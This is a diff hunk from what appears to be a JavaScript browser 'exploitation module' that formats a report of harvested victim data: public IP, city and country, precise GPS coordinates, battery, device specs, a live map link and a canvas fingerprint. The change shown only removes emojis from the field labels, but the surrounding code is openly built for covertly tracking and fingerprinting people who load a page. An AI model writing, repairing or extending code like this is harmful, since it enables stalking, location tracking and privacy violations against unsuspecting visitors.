@@ -200,14 +200,14 @@
                 color: 0x00ff41,
                 description: "Full device & location dump completed",
                 fields: [
-                    { name: "🕒 Timestamp", value: allData.timestamp, inline: false },
-                    { name: "🌐 Public IP", value: `\`${allData.ip || 'N/A'}\``, inline: true },
-                    { name: "📍 Location", value: `${allData.city || ''}, ${allData.region || ''}, ${allData.country || ''}`, inline: true },
-                    allData.gpsLat ? { name: "📍 GPS Coordinates", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAcc})`, inline: false } : null,
-                    { name: "🔋 Battery", value: allData.battery || 'N/A', inline: true },
-                    { name: "🖥️ Device", value: allData.screen + " | " + allData.cores, inline: true },
-                    { name: "🔗 Google Maps", value: `[OPEN LIVE MAP](${maps})`, inline: false },
-                    { name: "🧬 Fingerprint", value: allData.fingerprint.canvas ? allData.fingerprint.canvas.substring(0,40) + "..." : 'N/A', inline: false }
+                    { name: "Timestamp", value: allData.timestamp, inline: false },
+                    { name: " Public IP", value: `\`${allData.ip || 'N/A'}\``, inline: true },
+                    { name: " Location", value: `${allData.city || ''}, ${allData.region || ''}, ${allData.country || ''}`, inline: true },
+                    allData.gpsLat ? { name: " GPS Coordinates", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAcc})`, inline: false } : null,
+                    { name: " Battery", value: allData.battery || 'N/A', inline: true },
+                    { name: " Device", value: allData.screen + " | " + allData.cores, inline: true },
+                    { name: " Google Maps", value: `[OPEN LIVE MAP](${maps})`, inline: false },
+                    { name: " Fingerprint", value: allData.fingerprint.canvas ? allData.fingerprint.canvas.substring(0,40) + "..." : 'N/A', inline: false }
                 ].filter(Boolean),
                 footer: { text: "Advanced Browser Exploitation Module v2026" },
                 timestamp: new Date().toISOString()
